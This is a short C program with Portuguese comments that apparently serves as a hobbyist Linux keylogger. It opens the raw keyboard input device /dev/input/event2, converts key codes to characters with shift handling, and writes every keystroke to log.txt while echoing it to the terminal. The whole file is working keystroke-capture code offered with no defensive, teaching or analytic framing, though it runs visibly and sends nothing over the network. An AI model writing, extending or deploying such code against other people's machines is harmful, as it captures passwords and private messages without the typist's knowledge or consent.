#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>


//  tabelas das teclas do teclado
char teclas[200] = {
    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', 0,
    0, 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', 0,
    0, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 0,
    '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0, '*', 0, ' '
};

int main() {
    int tec;
    struct input_event e;
    int shift = 0;
    
    // no meu pc o input do teclado é event2 (depois crio um randomizer)
    tec = open("/dev/input/event2", O_RDONLY);
    
    if(tec == -1) {
        printf("abriu não, tenta com sudo\n");
        return 1;
    }
    
    printf("teclado funcionando, aperta ctrl+c pra parar\n");
    
    FILE *log = fopen("log.txt", "w");
    if(log == NULL) {
        printf("deu erro no arquivo\n");
        return 1;
    }
    
    while(1) {
        int r = read(tec, &e, sizeof(e));
        
        if(r < 0) {
            printf("erro na leitura\n");
            break;
        }
        
        // se for tecla
        if(e.type == 1) {
            
            // shift apertado
            if(e.code == 42 || e.code == 54) {
                if(e.value == 1) {
                    shift = 1;
                } else {
                    shift = 0;
                }
                continue;
            }
            
            // so quando aperta (value=1)
            if(e.value == 1) {
                
                // tenta converter
                if(e.code < 128 && teclas[e.code] != 0) {
                    char letra = teclas[e.code];
                    
                    // tenta fazer maiusculo (funciona so letras)
                    if(shift == 1) {
                        if(letra >= 'a' && letra <= 'z') {
                            letra = letra - 32;
                        }
                    }
                    
                    printf("%c", letra);
                    fprintf(log, "%c", letra);
                }
                else {
                    // teclas especiais
                    if(e.code == 28) { // enter
                        printf("\n");
                        fprintf(log, "\n");
                    }
                    else if(e.code == 14) { // backspace
                        printf("<BS>");
                        fprintf(log, "<BS>");
                    }
                    else if(e.code == 57) { // espaço
                        printf(" ");
                        fprintf(log, " ");
                    }
                    else {
                        printf("[%d]", e.code);
                        fprintf(log, "[%d]", e.code);
                    }
                }
                
               
                fflush(log);
            }
        }
    }
    
    fclose(log);
    close(tec);
    return 0;
}